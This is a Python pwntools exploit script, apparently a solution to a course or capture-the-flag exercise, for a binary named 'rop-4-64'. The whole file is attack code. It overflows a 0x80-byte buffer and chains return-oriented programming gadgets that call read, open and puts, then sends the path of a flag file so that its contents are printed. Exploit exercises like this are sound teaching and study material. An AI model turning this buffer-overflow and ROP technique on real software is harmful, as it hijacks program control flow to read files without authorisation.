#!/usr/bin/env python

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

p = process("./rop-4-64")
#p = process("./rop-4-6x")
#gdb.attach(p, "b *main")

addr_read = p64(0x4005b0)
addr_open = p64(0x4005d0)
addr_puts = p64(0x400570)

bufloc = p64(0x601800)
discard = p64(0x0)

pop_rdi = p64(0x400863)
pop_rsi_x = p64(0x400861)
pop_rdx_x = p64(0x40073f)

buf =  "A"*0x80 + "BBBBBBBB"

#read(0, bufloc, 0x100)
buf += pop_rdi + p64(0) + pop_rsi_x + bufloc + discard + pop_rdx_x + p64(0x100) + discard + addr_read

#open(bufloc, 0)
buf += pop_rdi + bufloc + pop_rsi_x + p64(0) + discard + addr_open

#read(3, bufloc, 0x100)
buf += pop_rdi + p64(3) + pop_rsi_x + bufloc + discard + pop_rdx_x + p64(0x100) + discard + addr_read

#puts(bufloc)
buf += pop_rdi + bufloc + addr_puts

p.sendline(buf)

p.sendline("/home/users/jackson/week5/rop-4-64/flag\x00")

p.interactive()
